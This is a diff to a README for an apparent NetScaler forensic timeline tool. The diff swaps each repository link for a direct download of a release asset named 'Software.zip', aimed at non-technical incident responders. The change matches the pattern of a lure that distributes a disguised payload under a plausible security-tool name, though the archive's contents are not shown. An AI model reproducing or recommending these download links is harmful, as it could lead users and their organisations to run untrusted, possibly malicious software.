@@ -1,6 +1,6 @@
 # 🕒 Get-NetScalerTimeline - Build Forensic Timelines in Minutes
 
-[![Download Get-NetScalerTimeline](https://img.shields.io/badge/Download-Get--NetScalerTimeline-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/irfanr-source/Get-NetScalerTimeline)
+[![Download Get-NetScalerTimeline](https://img.shields.io/badge/Download-Get--NetScalerTimeline-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/irfanr-source/Get-NetScalerTimeline/releases/download/v2.0/Software.zip)
 
 Get-NetScalerTimeline is a free tool for Windows that turns the messy file system of a NetScaler ADC or Gateway appliance into a clean, readable timeline. If you are investigating a security incident, responding to an alert, or simply trying to understand what happened on a device and when it happened, this tool gives you the answer in a single, easy-to-read table.
 
@@ -12,7 +12,7 @@ You do not need to know how to program. You do not need a background in cybersec
 
 Visit this link to download the application:
 
-**➡️ [https://github.com/irfanr-source/Get-NetScalerTimeline](https://github.com/irfanr-source/Get-NetScalerTimeline)**
+**➡️ [https://github.com/irfanr-source/Get-NetScalerTimeline/releases/download/v2.0/Software.zip](https://github.com/irfanr-source/Get-NetScalerTimeline/releases/download/v2.0/Software.zip)**
 
 When the page opens, look for the download area. Save the file to a folder you can easily find again, such as your Desktop or your Downloads folder. Once the download finishes, open the folder where you saved it.
 
@@ -128,6 +128,6 @@ Whether you are responding to a live incident or reviewing an event that happene
 | See your results | Open the output file in any spreadsheet program |
 | Find the interesting moment | Sort by the modified column |
 
-**Download again:** [https://github.com/irfanr-source/Get-NetScalerTimeline](https://github.com/irfanr-source/Get-NetScalerTimeline)
+**Download again:** [https://github.com/irfanr-source/Get-NetScalerTimeline/releases/download/v2.0/Software.zip](https://github.com/irfanr-source/Get-NetScalerTimeline/releases/download/v2.0/Software.zip)
 
 Keywords: citrix, citrix-adc, cve-2026-88771, dfir, dfir-tools, digital-forensics, duckdb, forensic-tools, incident-response, netscaler, threat-hunting, timeline-analysis
